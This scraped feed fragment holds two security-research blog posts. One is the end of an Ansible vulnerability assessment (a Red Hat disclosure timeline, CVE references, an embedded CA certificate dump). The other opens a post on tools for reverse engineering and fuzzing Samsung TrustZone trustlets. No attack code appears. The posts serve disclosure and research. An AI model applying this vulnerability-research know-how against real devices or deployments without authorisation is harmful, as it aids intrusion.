bugs on Feb. 17th, asks for a status update, date of fixes, and informs the plan to talk about the bugs on March 17th.</li> \n  <li>2020/02/17: Red Hat says that date for the fixes is not yet known, and that since bugs were discovered by Quarkslab, it's ok to discuss publicly any technical details.</li> \n  <li>2020/02/17: 8 CVEs were assigned by Red Hat (from CVE-2020-1733 to CVE-2020-1740).</li> \n  <li>2020/02/21: Red Hat asks for Quarkslab address to send us a gift :).</li> \n  <li>2020/02/26: Issues for the published CVEs were opened on GitHub.</li> \n  <li>2020/03/03: Quarkslab asks for status update and details about the remaining bugs.</li> \n  <li>2020/03/11: Prior request of status update resent.</li> \n  <li>2020/03/12: Red Hat acknowledges the remaining issues as bugs, design issues or notabug.</li> \n  <li>2020/03/13: Quarkslab sends more details about some bugs and explains why they should be considered as vulnerabilities.</li> \n  <li>2020/03/18: Red Hat publishes the CVE-2020-10685.</li> \n  <li>2020/03/23: Red Hat publishes the CVE-2020-10684.</li> \n  <li>2020/03/24: Merge requests for the last CVEs are created on GitHub.</li> \n  <li>2020/03/27: Red Hat informs Quarkslab that they changed the classification of two bugs to vulnerabilities. They request an embargo on the CVE-2020-10684.</li> \n  <li>2020/03/30: Quarkslab replies that CVE-2020-10684 is already a public issue on Ansible's public repo and includes a PoC for testing so embargo does not have any purpose. Quarkslab reminds Red Hat that the original report indicated Quarkslab would disclose the vulnerabilities on March 17th at the Quarks-in-the-Shell conference, and asks for the estimated date for fixes to be released.</li> \n  <li>2020/04/01: Red Hat replies that they cannot make any promises but the current estimated date for release of fixes is within the next <tt class=\"docutils literal\">Ansible</tt> release.</li> \n  <li>2020/04/17: <tt class=\"docutils literal\">Ansible</tt> v2.9.7 , v2.8.11 and v2.7.17 are released.</li> \n  <li>2020/07/03: Quarkslab receives two mugs and goodies from RedHat. Thank you :)</li> \n </ul> \n</div> \n<div class=\"section\" id=\"bonus\"> \n <h2>Bonus</h2> \n <div class=\"section\" id=\"embedded-certificate-authority-and-module-utils-urls\"> \n  <h3>Embedded Certificate Authority and <tt class=\"docutils literal\">module_utils.urls</tt></h3> \n  <p>We found an unknown valid Certificate Authority in the code used to fetch URLs <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id53\" id=\"id41\">[10]</a>. However, the certificate is still valid. Mercurial has the same issue but uses a CA that cannot be valid (the validity start date is after the validity end date) <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id54\" id=\"id42\">[11]</a>.</p> \n  <pre class=\"code literal-block\">\n$ openssl x509 -in ca.cert -noout -text\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            ef:04:d7:64:bb:fe:a1:29\n        Signature Algorithm: sha1WithRSAEncryption\n        Issuer: C = US, ST = North Carolina, L = Durham, O = Ansible\n        Validity\n            Not Before: Mar 18 22:00:22 2014 GMT\n            Not After : Mar 15 22:00:22 2024 GMT\n        Subject: C = US, ST = North Carolina, L = Durham, O = Ansible\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                RSA Public-Key: (1024 bit)\n                Modulus:\n                    00:db:6f:a4:fa:b7:22:53:65:45:b0:87:85:90:1c:\n                    3f:a5:82:ce:17:39:45:bb:03:ab:28:75:ce:b9:26:\n                    2e:2d:06:c1:c4:37:cf:fa:fd:81:a5:9f:40:16:21:\n                    1e:9a:1b:2b:64:e2:ab:5d:53:7e:b6:87:78:d0:77:\n                    fd:57:cd:22:68:d9:70:6a:4d:f0:59:77:31:6c:2e:\n                    ec:b7:d5:90:9c:b7:80:d3:67:c6:40:35:e0:6a:34:\n                    fc:b9:88:bd:11:47:85:bc:e0:7e:ea:3d:34:58:23:\n                    3e:69:9a:6f:d7:aa:5c:97:1e:a9:92:25:cf:60:bc:\n                    c4:0e:c4:78:6e:e4:bb:4f:af\n                Exponent: 65537 (0x10001)\n        X509v3 extensions:\n            X509v3 Subject Key Identifier:\n                F9:CD:D6:73:D1:A8:D0:D7:1A:50:AA:0A:F7:59:72:14:4D:8B:F1:5A\n            X509v3 Authority Key Identifier:\n                keyid:F9:CD:D6:73:D1:A8:D0:D7:1A:50:AA:0A:F7:59:72:14:4D:8B:F1:5A\n                DirName:/C=US/ST=North Carolina/L=Durham/O=Ansible\n                serial:EF:04:D7:64:BB:FE:A1:29\n\n            X509v3 Basic Constraints:\n                CA:TRUE\n    Signature Algorithm: sha1WithRSAEncryption\n         31:40:7c:d0:84:7a:92:7a:bd:2b:fb:58:fa:1b:cf:b1:97:ab:\n         e9:e1:4c:cc:ed:c9:1a:44:45:06:1d:a4:9f:a2:5d:30:39:e1:\n         60:65:fb:01:75:47:19:f9:6b:c0:d4:07:a8:5c:be:69:e9:d6:\n         5e:c0:b4:66:fa:e2:90:5c:5b:42:75:fc:19:5b:43:00:3b:55:\n         ce:7c:4e:8b:b5:f3:17:0e:c9:3b:17:6c:56:ba:57:81:23:74:\n         7a:1d:1a:33:3b:d5:cc:a3:d9:b1:9d:a6:89:51:9c:96:27:09:\n         1f:39:b9:ab:4f:34:6f:5a:7f:b1:9b:6e:28:81:19:93:ab:d9:\n         a8:48\n</pre> \n  <p>This certificate is used on macOS controllers to prevent an error when no certificate is found. However, after reading the whole file, we found that <tt class=\"docutils literal\">Ansible</tt> establishes two HTTPS connections for each URL to query.</p> \n  <p>The first connection is used to validate that the domain of the certificate matches the URL. This connection only performs SSL layers and is closed without sending an HTTP request. The second connection is used to perform the expected action. The dummy CA is only included on the trusted CA for the first connection. The certificate validation of the second connection is unchanged and performed without custom handlers.</p> \n  <p>The first connection seems to be a patch of the CVE-2015-3908. A closed issue explains the reason for the CA <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id55\" id=\"id43\">[12]</a>.</p> \n </div> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id44\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id1\">[1]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/ansible/ansible/\">https://github.com/ansible/ansible/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id45\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id16\">[2]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/plugins/action/__init__.py#L333\">https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/plugins/action/__init__.py#L333</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id46\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id18\">[3]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.ansible.com/ansible/latest/user_guide/playbooks_best_practices.html#content-organization\">https://docs.ansible.com/ansible/latest/user_guide/playbooks_best_practices.html#content-organization</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id47\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id19\">[4]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.ansible.com/ansible/latest/user_guide/playbooks_variables.html#variables-discovered-from-systems-facts\">https://docs.ansible.com/ansible/latest/user_guide/playbooks_variables.html#variables-discovered-from-systems-facts</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id48\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[5]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id20\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id21\">2</a>)</em> <a class=\"reference external\" href=\"https://docs.ansible.com/ansible/latest/user_guide/playbooks_variables.html#ansible-variable-precedence\">https://docs.ansible.com/ansible/latest/user_guide/playbooks_variables.html#ansible-variable-precedence</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id49\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[6]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id22\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id24\">2</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id28\">3</a>)</em> <a class=\"reference external\" href=\"https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/vars/clean.py#L99\">https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/vars/clean.py#L99</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id50\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[7]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id23\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id25\">2</a>)</em> <a class=\"reference external\" href=\"https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/vars/clean.py#L119\">https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/vars/clean.py#L119</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id51\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[8]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id26\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id27\">2</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id29\">3</a>)</em> <a class=\"reference external\" href=\"https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/vars/clean.py#L171\">https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/vars/clean.py#L171</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id52\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[9]</td> \n    <td><a class=\"reference external\" href=\"https://docs.ansible.com/ansible/latest/user_guide/vault.html#vault-payload-format-1-1-1-2\">https://docs.ansible.com/ansible/latest/user_guide/vault.html#vault-payload-format-1-1-1-2</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id53\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id41\">[10]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/module_utils/urls.py#L264\">https://github.com/ansible/ansible/blob/v2.8.10/lib/ansible/module_utils/urls.py#L264</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id54\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id42\">[11]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.mercurial-scm.org/repo/hg/rev/d7f7f1860f00\">https://www.mercurial-scm.org/repo/hg/rev/d7f7f1860f00</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id55\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id43\">[12]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/ansible/ansible/issues/24152\">https://github.com/ansible/ansible/issues/24152</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id56\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id3\">[13]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/quarkslab/qb.backup\">https://github.com/quarkslab/qb.backup</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id57\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id4\">[14]</a></td> \n    <td><a class=\"reference external\" href=\"https://quarkslab.com/irma/\">https://quarkslab.com/irma/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id58\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id2\">[15]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.ansible.com/ansible/latest/user_guide/playbooks_intro.html\">https://docs.ansible.com/ansible/latest/user_guide/playbooks_intro.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id59\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id15\">[16]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.ansible.com/ansible/latest/plugins/become.html\">https://docs.ansible.com/ansible/latest/plugins/become.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1733\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1733]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id5\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id17\">2</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id39\">3</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1733\">https://access.redhat.com/security/cve/cve-2020-1733</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1734\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1734]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id6\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id33\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1734\">https://access.redhat.com/security/cve/cve-2020-1734</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1735\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1735]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id7\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id34\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1735\">https://access.redhat.com/security/cve/cve-2020-1735</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1736\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1736]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id8\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id35\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1736\">https://access.redhat.com/security/cve/cve-2020-1736</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1737\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1737]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id9\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id36\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1737\">https://access.redhat.com/security/cve/cve-2020-1737</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1738\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1738]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id10\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id37\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1738\">https://access.redhat.com/security/cve/cve-2020-1738</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1739\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1739]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id11\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id38\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1739\">https://access.redhat.com/security/cve/cve-2020-1739</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-1740\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-1740]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id12\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id32\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-1740\">https://access.redhat.com/security/cve/cve-2020-1740</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-10684\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-10684]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id13\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id30\">2</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id40\">3</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-10684\">https://access.redhat.com/security/cve/cve-2020-10684</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"cve-2020-10685\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[CVE-2020-10685]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id14\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id31\">2</a>)</em> <a class=\"reference external\" href=\"https://access.redhat.com/security/cve/cve-2020-10685\">https://access.redhat.com/security/cve/cve-2020-10685</a></td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"html","publishedDate":"Wed, 27 May 2020 22:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-05-28_ansible/ansible-architecture.png","linkMd5":"c919f76de397f905c0933c5249b3e20c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn54@2020_3/2020/08/25/01-15-09-142_6b7893c403eaa2ea.webp","destWidth":1596,"destHeight":1236,"sourceBytes":160324,"destBytes":73468,"author":"Damien Aumaitre","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-05-28_ansible/ansible-architecture.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn54@2020_3/2020/08/25/01-15-09-142_6b7893c403eaa2ea.webp","http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn39@2020_1/2020/08/25/01-15-14-523_d6215c14bfa11c5a.webp","http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_root.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn4@2020_3/2020/08/25/01-15-13-472_637f0d749c43d1d1.webp","http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_become.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn84@2020_4/2020/08/25/01-15-13-455_36faa24f7ffe318c.webp","http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_become_vuln.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn7@2020_3/2020/08/25/01-15-15-226_ff215bdaf98258d2.webp","http://blog.quarkslab.com/resources/2020-05-28_ansible/Var_manager_2.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn4@2020_5/2020/08/25/01-15-12-559_d82689ddc2c543f9.webp","http://blog.quarkslab.com/resources/2020-05-28_ansible/playbook_multiple_user_vuln_p1.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn64@2020_4/2020/08/25/01-15-12-765_6ba18559c4dbe741.webp","http://blog.quarkslab.com/resources/2020-05-28_ansible/playbook_multiple_user_vuln_p2.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn75@2020_3/2020/08/25/01-15-15-339_cae619074725dc40.webp"},"publishedOrCreatedDate":1598318092717},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"A Deep Dive Into Samsung's TrustZone (Part 2)","link":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html","description":"<script src=\"resources/2019-12-10-samsung_trustzone_exploitation_part2/asciinema-player.js\"></script> \n<link rel=\"stylesheet\" href=\"resources/2019-12-10-samsung_trustzone_exploitation_part2/asciinema-player.css\" /> \n<style> img { border: none; border-radius: 0px; padding: 4px; margin: 1em 1em 1em 0; box-shadow: none; max-width: 100%; max-height: 450px; width:auto; height: auto; } .align-center { margin-top: 20px; margin-bottom: 20px; } </style> \n<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>After detailing Samsung's TrustZone implementation in the first part of this series, this blog post introduces the tools that we have developed to reverse engineer the system and find vulnerabilities more easily.</p> \n <ul class=\"simple\"> \n  <li><a class=\"reference external\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html\">Part 1</a>: Detailed overview of Samsung's TrustZone components</li> \n  <li>Part 2: Tools development for reverse engineering and vulnerability research</li> \n  <li>Part 3: Vulnerability exploitation to reach code execution in EL3 on a Samsung device</li> \n </ul> \n</div> \n<div class=\"section\" id=\"reverse-engineering-and-tools-development\"> \n <h2>Reverse Engineering and Tools Development</h2> \n <p>During the course of this research, we have developed quite a few different tools:</p> \n <ul class=\"simple\"> \n  <li>a Ghidra loader for the MCLF format used by the trustlets;</li> \n  <li>an IDA Pro/Ghidra script that renames the tlApi functions automatically;</li> \n  <li>a Python framework for communicating with trustlets;</li> \n  <li>an emulator/fuzzer based on AFL and the Unicorn engine;</li> \n  <li>a Manticore script that performs symbolic execution;</li> \n  <li>an IDA Pro/Ghidra loader for SBOOT binaries.</li> \n </ul> \n <p>We're happy to announce that we are releasing all of them today!</p> \n <div class=\"section\" id=\"reverse-engineering-trusted-applications\"> \n  <h3>Reverse Engineering Trusted Applications</h3> \n  <p>Trustlets are located on the file system of the device as binaries. As mentioned in the previous blog post, they are in a custom file format called the <em>MobiCore Loadable Format</em> (MCLF). Loading these into a Software Reverse Engineering (SRE) tool like IDA Pro or Ghidra is the very first step of a journey into Samsung's TrustZone ecosystem.</p> \n  <p>Luckily for us, there already existed an IDA Pro loader called <a class=\"reference external\" href=\"https://github.com/ghassani/mclf-ida-loader\">mclf-ida-loader</a> developed by <a class=\"reference external\" href=\"https://github.com/ghassani\">Gassan Idriss</a>. Nevertheless, we took the time to port it to Ghidra to <a class=\"reference external\" href=\"http://zer0con.org/archive/2019.html#training-section\">allow</a> <a class=\"reference external\" href=\"https://hardwear.io/usa-2019/training/alexandre-adamski-joffrey-guilbon.php\">our</a> <a class=\"reference external\" href=\"https://hardwear.io/berlin-2020/training/attacking-arm-trustzone.php\">training</a> <a class=\"reference external\" href=\"https://troopers.de/troopers19/trainings/kgbt8q/\">attendees</a> to use free software if they wanted to.</p> \n  <p>Both loaders operate in a similar way:</p> \n  <ul class=\"simple\"> \n   <li>they start by parsing the MCLF header of the binary;</li> \n   <li>they map the <tt class=\"docutils literal\">TEXT</tt>, <tt class=\"docutils literal\">DATA</tt> and <tt class=\"docutils literal\">BSS</tt> segments into memory;</li> \n   <li>they mark the entry point defined in the header;</li> \n   <li>they add a symbol for the <em>MobiCore LIBrary</em> handler.</li> \n  </ul> \n  <p>The Ghidra port of the loader can be downloaded on GitHub at <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/tree/master/scripts/loaders/Ghidra/mclfloader\">mclf-ghidra-loader</a>.</p> \n  <p>As can be expected, the trustlets binaries are stripped of their symbols. But there are at least some functions that can be easily identified: the tlApi/drApi stubs. We automated this process by writing an <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/blob/master/scripts/scripts/IDAPro/find_symbols.py\">IDAPython script</a>, and later <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/blob/master/scripts/scripts/Ghidra/FindSymbols.py\">port it to Ghidra</a>. This script does the following:</p> \n  <ul class=\"simple\"> \n   <li>it loads the mapping between names and numeric identifiers;</li> \n   <li>it tries to define functions that might have been missed;</li> \n   <li>it iterates over the cross-references to the mcLib entry point;</li> \n   <li>it extracts the identifier from the stub instructions;</li> \n   <li>it renames and sets the prototype of the function accordingly.</li> \n  </ul> \n  <p>Here is what the database looks like before applying the script:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/script_before.png\" /> \n  <p>Here is what it looks like after, with all the functions renamed:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/script_after.png\" /> \n </div> \n <div class=\"section\" id=\"emulating-trusted-applications\"> \n  <h3>Emulating Trusted Applications</h3> \n  <p>After reversing a few trustlets, manually finding vulnerabilities and trying to exploit them, it became clear that doing it statically was not the best way to go. Some kind of dynamic analysis was needed, so we developed <a class=\"reference external\" href=\"https://github.com/quarkslab/samsung-trustzone-research/blob/master/emulator/emulator.py\">an emulator</a>.</p> \n  <p>This trustlet emulator is based on the <a class=\"reference external\" 